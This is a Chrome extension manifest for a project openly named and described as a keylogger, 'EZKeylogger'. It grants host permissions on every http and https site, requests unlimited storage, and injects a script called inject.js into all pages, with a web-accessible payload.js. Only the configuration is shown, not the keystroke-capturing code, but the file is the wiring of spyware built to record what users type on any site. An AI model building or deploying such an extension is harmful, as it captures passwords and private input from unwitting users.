{
  "name": "EZKeylogger",
  "version": "0.0.1",
  "manifest_version": 2,
  "description": "A keylogger for Google Chrome",
  "homepage_url": "http://www.ericzhang.me",
  "icons": {
    "16": "icons/icon16.png",
    "48": "icons/icon48.png",
    "128": "icons/icon128.png"
  },
  "options_page": "src/options/index.html",
  "permissions": [
    "http://*/*",
    "https://*/*",
    "storage",
    "unlimitedStorage"
  ],
  "web_accessible_resources": [
    "src/inject/payload.js"
  ],
  "content_scripts": [
    {
      "matches": [
        "http://*/*",
        "https://*/*"
      ],
      "js": [
        "src/inject/inject.js"
      ]
    }
  ]
}